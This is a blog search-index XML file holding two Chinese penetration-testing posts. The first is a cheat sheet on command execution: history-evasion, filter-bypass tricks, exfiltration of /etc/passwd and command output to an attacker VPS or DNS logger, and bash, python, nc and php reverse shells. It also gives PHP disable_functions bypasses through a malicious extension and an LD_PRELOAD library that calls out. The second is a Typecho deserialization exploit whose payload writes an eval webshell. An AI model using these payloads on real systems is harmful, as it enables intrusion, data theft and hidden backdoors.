<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[各种命令执行总结]]></title>
    <url>%2F2018%2F03%2F23%2Fcommand-execute.html</url>
    <content type="text"><![CDATA[好久没更博客了，就把笔记里的东西整理一下发出来，里面还是有一些少见的trick的~本文持续更新~ 首先说一个小trick:在渗透过程中，我们常常需要清理痕迹，而在history中会记录命令执行历史，我们可以清除history。也有一个简单方法使得在终端执行的命令不被记录，实现方法很简单，在执行的命令前添加空格即可，该方法仅限在debain内核的系统中。 0X01 linux命令执行如何判断是否是linux命令执行可以使用的判断方法有&amp;+命令或|+命令，如： ping &amp;id 或 ping |idcurl &amp;id 或 curl |id 通过返回结果可判断是否是命令执行，同时这也是在前面有ping和curl的情况下进行命令执行的一种方法 读取文件当cat被过滤时，可尝试一下几种读取文件方法： strings flag.phpecho &gt; flag.phpuniq -c flag.phpbash -v flag.phprev flag.php 或者使用curl上传到vps，并在vps上开启监听进行读取： curl -T flag.php “http://192.168.x.xxx:6666“或curl “http://vps/“ –data-binary @/etc/passwd…在vps上：nc -lvpn 6666 空格绕过如果过滤了空格，常用的绕过方法有 $IFS{ls,-l}cat%09flag.phpcat &lt; flag.phpcat&lt;&gt;flag.php 其中后面两个适用于读取文件,而前两个则可完全代替空格，中间的%09需在php环境下，为了避免$IFS与后面的字符串写在一起被误解，需要分隔开$IFS，常用的方法有一下几种： ${IFS}$IFS$9$IFS\ 这里解释一下，$9是linux系统shell进程的第九个参数，始终为空字符串 /绕过 ${PATH:0:1} // ${str:a:b}表示提取字符串a开始的b个字符 ${PATH%%u*} 上面两个都能得到’/‘字符 利用同样的思路(即字符串截取)，我们可以得到更多~ 当然，一切都要建立在没有过滤$,{和}的基础上 加号绕过 $PS4 大于号绕过 $PS2 对某些命令的过滤当某些命令被正则匹配的方式过滤时，可以考虑的绕过方法如下： 字符串拼接： a=un;b=ame;$a$b若’;’被过滤，还可用%0a代替分号a=un%0ab=ame%0a$a$b 字符串截取： root@xxx:~# echo ${PATH:9:1}${PATH:11:1}lsroot@xxx:~# ${PATH:9:1}${PATH:11:1}Desktop 公共 模板 视频 图片 文档 下载 音乐 桌面 如果冒号被过滤，可以使用：root@xxx:~# $(expr substr $PATH 10 1)$(expr substr $PATH 12 1)Desktop 公共 模板 视频 图片 文档 下载 音乐 桌面 base64编码： root@xxx:~# echo “dW5hbWU=” | base64 -d |bashroot xxd（16进制）: root@xxx:~# printf “77686f616d69” | xxd -r -p | bashroot 利用反斜线来绕过: una\me 插入空字符串： u``nameu’’nameu””nameu${xxx}name 对文件名的过滤可用正则绕过，如flag被过滤的情况下读取flag.php，则可以使用：cat fla*来绕过 多条命令执行常见于curl/ping x.x.x.x,且x.x.x.x可控，此时可利用管道符，逻辑运算符，分号及%0a来绕过 ping x.x.x.x |lsping x.x.x.x ||lsping x.x.x.x&amp;lsping x.x.x.x&amp;&amp;lsping x.x.x.x;ls 在地址栏执行时可以利用回车的url编码%0a绕过：ping x.x.x.x%0als 对回显限制如果对回显中的特殊字符进行检测，则可以通过base64或16进制编码绕过，如 ls|base64 无回显可尝试构建一条带外信道提取数据，如： curl (你的ip)/?`whoami` 然后查看Apache日志curl `whoami`.3eea625fcaceaafc7db2.d.zhack.ca (该网站能直接返回接受的数据)S命令执行返回的结果不能包含空格和回车，可以通过base64编码或者如cat flag.php|sed &#39;s/[[:space:]]//g&#39;来清除空格,回车替换可以用sed &#39;:a;N;s/\n/*/;ba&#39;，这样就将回车换成了*S号 (因为sed默认是逐行处理数据，所以sed默认情况下不会处理到换行符，直接用sed s/\n/*/g不可行) 如果不想编码，还可以将数据附在HTTP头，如curl &quot;http://vpsip/&quot; -H &quot;User-Agent: $(id)&quot;或者post数据：id | curl &quot;http://vpsip/&quot; --data-binary @- 0X02 常用shell反弹网上有很多文章总结了，这里简单列举几个: bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.0.0.1”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’ 0X03 Python命令执行下面是python中可用于命令执行的模块 ossubprocesscommandsplatformtimeitpicklepydoc 举例： 123#coding:utf-8import timeittimeit.timeit("__import__('os').system('')", number=1) 12import platformprint platform.popen('id', mode='r', bufsize=-1).read() 123import osos.system() print os.popen().read() 123import subprocesssubprocess.call(["cmd","arg1","arg2"],shell=True)subprocess.Popen('ls', shell=True) 12import commandsprint commands.getoutput('ls') 12import pydocpydoc.pipepager(None,'id') 12import picklepickle.loads("cos\nsystem\n(S'ifconfig'\ntR.") 上面列举的模块有几个很少见，导致在CTF中或沙盒中经常没有被过滤，最典型的就是mimetool模块，我做题至今暂未遇到过滤了该模块的，可以说是十分好用了。 当常见的os,subprocess,commands等被过滤时，除了可尝试用另外几个模块来实现命令执行外，也可灵活使用rot13编码绕过： 其中，有一点需要注意的是，subprocess中的shell如果shell=True的话，curl命令是被Bash(Sh)启动，所以支持shell语法。 如果shell=False的话，启动的是可执行程序本身，后面的参数不再支持shell语法(即执行的命令不能带有参数)。 pydoc更多玩法当系统中PAGER环境变量被设置时，pydoc模块将使用该值作为导入文档，这一点可以被用来执行任意命令，比如：12341.py：#!/usr/bin/pythonimport pydocpydoc.pager("") 此时在命令行: $ export PAGER=”whoami”$ python 1.py 此时命令行会显示结果: root python沙盒绕过简单的沙盒的绕过方法可以通过编码，如12#coding: rot_13&apos;vzcbeg bf&apos; //import os 有篇文章详细介绍了python沙盒绕过的各种方法：Python沙箱逃逸的n种姿势，这篇文章讲的很全面，这里就不再重述 0X04 PHP命令执行常用的php环境下命令执行操作汇总如下： 获取当前文件路径 echo dirname(__FILE__) ;echo getcwd(); 获取同目录下的所有文件名称 echo var_dump(glob(‘./*’));system(“ls”)/system(“dir”)/system–&gt;可换成执行系统命令的函数; 读取某个文件的内容 echo file_get_contents(“flag.php”);echo fgets(fopen(“flag.php”,”r”));show_source(“flag.php”);echo fread(fopen(“flag.php”,”r”),filesize(“flag.php”));echo var_dump(file(“flag.php”));copy(“flag.php”,”daiker.txt”);include ‘php://filter/read=convert.base64-encode/resource=flag.php’;highlight_file(“flag.php”); php配置文件里面有个disable_functions = …，可以用来禁止某些php函数，若常见能够执行系统命令的函数被禁用，又如何命令执行呢首先看看能够执行命令的函数： systemassertpassthruexecpcntl_execshell_execpopenproc_open 由于函数未禁用全，从而导致命令执行的案例也是很多的，所以当一些函数被禁止时，可尝试其他一些函数 当以上函数都被过滤时，可以使用下面几种方法： 拓展库绕过Linux下可通过编译拓展库进行绕过，在得知目标服务器的php版本后，本地下载相同版本的php源码包，并生成一个精心构造的拓展库，再使用dl函数调用拓展库即可实现命令执行，具体操作如下：123456789101112131415161718192021222324252627下载好php源码包后：tar zxvf php-5.3.10.tar.gzcd php-5.3.10/ext./ext_skel --extname=shell //生成名为shell的拓展库cd shellvi config.m4将以下三行前面的dnl去掉，然后保存退出：PHP_ARG_WITH(dl, for dl support,Make sure that the comment is aligned:[ --with-dl Include dl support])whereis phpize //找出phpize路径/usr/local/bin/phpize // 运行phpizevi shell.c在if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s&quot;, &amp;arg, &amp;arg_len) == FAILURE) &#123; return;&#125;这一行下面添加：system(arg) 然后：whereis php-config //找出php-config的路径./configure --whith-php-config=php-config路径makemake install 将生成的拓展库文件/usr/local/lib/php/extensions/no-debug-non-zts-20180130/shell.so拷贝到extension_dir目录下，若extension_dir目录无写权限则先写入任意目录 , 在payload中用../../来实现调用payload如下：1234&lt;?phpdl("shell.so"); //shell.so在extension_dir目录，如不在则用../../来实现调用confirm_dl_compiled("$_GET[a]&gt;flag.txt");?&gt; cat flag.txt便可看到命令执行结果，当然，如果dl函数被禁用，该方法便无效了 LD_PRELOAD劫持当disable_functions 中没有禁止 putenv函数时，可以考虑上传个so文件进行LD_PRELOAD劫持，方法如下：在本地，vim shell.c 12345678910111213#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; void payload() &#123; system("curl `whoami`.9b8534989b407ad73d33.d.zhack.ca");&#125; int geteuid() &#123;if (getenv("LD_PRELOAD") == NULL) &#123; return 0; &#125;unsetenv("LD_PRELOAD");payload();&#125; 当这个共享库中的geteuid被调用时，会加载payload()函数，从而实现执行命令。本地把它编译为一个位置信息无关的动态共享库： $ gcc -c -fPIC shell.c -o shell$ gcc -shared shell -o shell.so 写一个简单的利用文件1.php：1234&lt;?phpputenv("LD_PRELOAD=./shell.so");mail("root@localhost","","","","");?&gt; 将生成的shell.so及1.php上传到目标服务器，浏览器访问1.php，在dnsbin（可换成自己的vps）上可接收到whoami执行后的结果 该方法的前提是能够上传文件 xdebugXdebug 是一个 PHP 的调试工具，支持在本地通过源码远程调试服务器上的 PHP 代码，当xdebug.remote_connect_back选项为1时，可以进行远程调试，从而执行任意php函数,详情利用方式可见rr师傅博客：https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface perl命令执行perl中的open函数可以执行命令，在ctf的linux命令执行中可能会遇到用法如下： 创建一个类似格式为’命令|’的文件，再使用 GET &#39;file:命令|&#39;即可执行该命令，需要注意的是GET命令不是linux自带命令，而是存在于libwww-perl中，apt可安装 之所以使用GET命令可以命令执行，是因为GET函数底层调用了open函数]]></content>
  </entry>
  <entry>
    <title><![CDATA[typecho反序列化漏洞复现]]></title>
    <url>%2F2017%2F10%2F29%2Ftypecho-deserialization.html</url>
    <content type="text"><![CDATA[typecho反序列化漏洞复现0X00 前言Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。 0X01. 漏洞版本V1.1-15.5.12-beta以前 0X02 漏洞分析反序列化可控点：install.php 229~235行该博客程序判断是否安装的代码如下12345678910111213141516171819//判断是否已经安装if (!isset($_GET['finish']) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') &amp;&amp; empty($_SESSION['typecho'])) &#123; exit;&#125;// 挡掉可能的跨站请求if (!empty($_GET) || !empty($_POST)) &#123; if (empty($_SERVER['HTTP_REFERER'])) &#123; exit; &#125; $parts = parse_url($_SERVER['HTTP_REFERER']); if (!empty($parts['port'])) &#123; $parts['host'] = "&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"; &#125; if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) &#123; exit; &#125;&#125; 这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。既然能进入install.php,那么现在先决条件已具备，接着分析。 这里有一个反序列化操作，而参数从cookie获取，可控。 想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中： Typecho_FeedTypecho_ConfigTypecho_Db_Query 分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索__get()方法，有好几处，分析后发现在Typecho_Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法 跟进该方法醒目的array_map函数和call_user_func函数。。。至此POP链已经构造完成。 0X03 Payload1234567891011121314151617181920&lt;?phpclass Typecho_Feed&#123; private $_type = 'RSS 2.0'; private $_items; public function __construct($a) &#123; $this-&gt;_items[] = array('author'=&gt;$a); &#125;&#125;class Typecho_Request&#123; private $_params = array('screenName'=&gt;'file_put_contents('shell.php', '&lt;?php @eval($_POST[tharavel]);?&gt;')'); private $_filter = array('assert');&#125;$payload1 = new Typecho_Request();$payload2 = new Typecho_Feed($payload1);$exp = array('adapter' =&gt; $payload2, 'prefix' =&gt; 'typecho');echo base64_encode(serialize($exp));]]></content>
  </entry>
</search>